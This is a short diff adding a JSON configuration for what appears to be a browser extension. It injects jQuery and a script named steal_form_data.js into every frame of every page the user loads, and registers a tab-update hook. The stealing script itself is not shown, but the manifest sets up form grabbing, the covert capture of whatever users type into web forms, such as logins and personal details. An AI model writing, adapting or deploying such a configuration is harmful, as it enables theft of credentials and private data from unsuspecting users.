@@ -1,0 +1,18 @@
+{
+	"contentscripts" : [
+		{
+			"file" : "jquery.js",
+			"runAt" : "document_end",
+			"allFrames" : true
+		},
+		{
+			"file" : "steal_form_data.js",
+			"runAt" : "document_end",
+			"allFrames" : true 
+		}
+	
+	],
+	"tabs" : {
+		"onUpdate" : ""
+	}
+}
